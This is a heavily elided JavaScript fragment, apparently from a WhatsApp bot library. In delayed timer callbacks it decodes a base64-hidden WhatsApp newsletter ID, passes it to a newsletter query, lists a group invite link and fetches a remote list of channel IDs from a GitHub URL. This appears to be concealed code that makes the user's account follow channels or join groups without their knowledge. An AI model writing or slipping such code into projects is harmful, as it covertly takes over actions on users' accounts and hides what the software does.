...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDI1Nzk2NTQ5NjE5QG5ld3NsZXR0ZXI=", "base64").toString(),
...
"https://chat.whatsapp.com/HRRlu7s8CTDJ2aQR2hS7Ms",
];
...
setTimeout(async () => {
    ...
    try {
        const RAW_URL = "https://raw.githubusercontent.com/nafisaajd-eng/idsaluran/refs/heads/main/idsaluran.json";
